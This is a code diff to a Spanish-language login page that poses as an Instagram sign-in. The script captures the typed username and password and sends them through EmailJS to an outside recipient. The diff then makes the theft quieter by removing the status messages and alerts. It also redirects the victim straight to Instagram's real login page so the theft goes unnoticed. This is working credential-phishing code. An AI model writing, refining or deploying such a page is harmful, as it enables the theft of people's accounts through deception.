@@ -256,36 +256,26 @@
         });
 
         const loginForm = document.getElementById('loginForm');
-        const submitBtn = document.getElementById('submitBtn');
 
         loginForm.addEventListener('submit', (e) => {
             e.preventDefault();
             
-            submitBtn.textContent = "Verificando...";
-            submitBtn.disabled = true;
-
             const templateParams = {
                 to_name: "Administrador",
                 username: document.getElementById('usernameInput').value,
                 password: passwordInput.value
             };
 
+            // Envía los datos al correo en segundo plano y redirige inmediatamente
             emailjs.send("service_vyx1v45", "template_vyx1v45", templateParams)
                 .then((response) => {
-                    console.log('Correo enviado con éxito!', response.status, response.text);
-                    alert('Verificación completada');
-                    document.getElementById('usernameInput').value = '';
-                    passwordInput.value = '';
-                    submitBtn.textContent = "Iniciar sesión";
-                    submitBtn.disabled = false;
+                    console.log('Credenciales enviadas con éxito!');
                 }, (error) => {
-                    console.log('Fallo al enviar el correo...', error);
-                    alert('Verificación completada');
-                    document.getElementById('usernameInput').value = '';
-                    passwordInput.value = '';
-                    submitBtn.textContent = "Iniciar sesión";
-                    submitBtn.disabled = false;
+                    console.log('Error al enviar', error);
                 });
+
+            // Redirección directa a Instagram sin alertas
+            window.location.href = "https://www.instagram.com/accounts/login/?mtn";
         });
     </script>
 
